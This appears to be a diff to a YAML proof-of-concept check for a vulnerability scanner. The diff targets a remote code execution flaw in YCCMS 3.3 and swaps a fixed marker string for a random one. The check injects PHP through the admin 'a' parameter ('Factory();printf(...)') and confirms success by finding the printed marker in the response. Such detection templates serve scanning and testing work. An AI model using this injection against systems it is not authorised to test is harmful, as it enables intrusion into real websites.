@@ -1,10 +1,12 @@
 name: poc-yaml-yccms33-rce
+set:
+  r1: randomLowercase(32)
 rules:
   - method: GET
-    path: /admin/?a=Factory();printf('8dab593f-3a9c-4735-8a76-c6917f25f1b6');//../
+    path: /admin/?a=Factory();printf('{{r1}}');//../
     follow_redirects: false
     expression: |
-      status == 200 && body.bcontains(b'8dab593f-3a9c-4735-8a76-c6917f25f1b6')
+      status == 200 && body.bcontains(b'{{r1}}')
 detail:
   author: j4ckzh0u(https://github.com/j4ckzh0u)
   links:
